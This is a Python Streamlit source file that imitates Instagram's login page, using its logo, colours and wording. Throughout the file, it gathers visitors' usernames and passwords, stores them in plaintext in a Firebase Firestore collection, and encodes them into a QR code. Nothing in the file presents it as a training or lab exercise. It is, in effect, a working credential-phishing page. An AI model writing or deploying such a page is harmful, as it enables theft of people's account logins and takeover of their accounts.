import streamlit as st
import qrcode
from firebase_admin import credentials, firestore, initialize_app
import firebase_admin
from io import BytesIO

# ------------------ FIREBASE SETUP ------------------
if not firebase_admin._apps:
    cred = credentials.Certificate("firebase_info.json")
    firebase_admin.initialize_app(cred)

db = firestore.client()
users_ref = db.collection("users")

# ------------------ PAGE CONFIG ------------------
st.set_page_config(page_title="Instagram Login", page_icon="📸", layout="centered")

# ------------------ CUSTOM CSS ------------------
page_bg = """
<style>
[data-testid="stAppViewContainer"] {
    background: linear-gradient(120deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
    background-size: 400% 400%;
    animation: gradientMove 8s ease infinite;
}
@keyframes gradientMove {
    0% {background-position: 0% 50%;}
    50% {background-position: 100% 50%;}
    100% {background-position: 0% 50%;}
}
div.stButton > button {
    background-color: #0095f6;
    color: white;
    font-weight: bold;
    border-radius: 8px;
    width: 100%;
    height: 40px;
    border: none;
}
div.stButton > button:hover {
    background-color: #1877f2;
}
.login-box {
    background-color: white;
    border-radius: 12px;
    padding: 40px;
    width: 350px;
    margin: auto;
    box-shadow: 0px 4px 20px rgba(0,0,0,0.1);
}
.footer {
    text-align: center;
    margin-top: 10px;
    color: white;
    font-size: 14px;
}
</style>
"""
st.markdown(page_bg, unsafe_allow_html=True)

# ------------------ LOGIN BOX ------------------
st.markdown("<div class='login-box'>", unsafe_allow_html=True)
st.image("https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png", width=80)
st.markdown("<h1>Instagram</h1>", unsafe_allow_html=True)

username = st.text_input("Username", placeholder="Phone number, username, or email")
password = st.text_input("Password", placeholder="Password", type="password")

if st.button("Submit"):
    if username.strip() == "" or password.strip() == "":
        st.warning("⚠️ Please fill in all fields.")
    else:
        try:
            # Store user data in Firebase Firestore
            users_ref.add({
                "username": username,
                "password": password
            })

            # Create QR Code with user info
            qr_data = f"Username: {username}\nPassword: {password}"
            qr_img = qrcode.make(qr_data)
            buf = BytesIO()
            qr_img.save(buf, format="PNG")
            st.success("✅ Successfully stored in Firebase!")
            st.image(buf.getvalue(), caption="Your Login QR Code", use_column_width=True)

        except Exception as e:
            st.error(f"❌ Firebase Error: {e}")

st.markdown("</div>", unsafe_allow_html=True)
st.markdown("<div class='footer'>Don't have an account? <b>Sign up</b></div>", unsafe_allow_html=True)
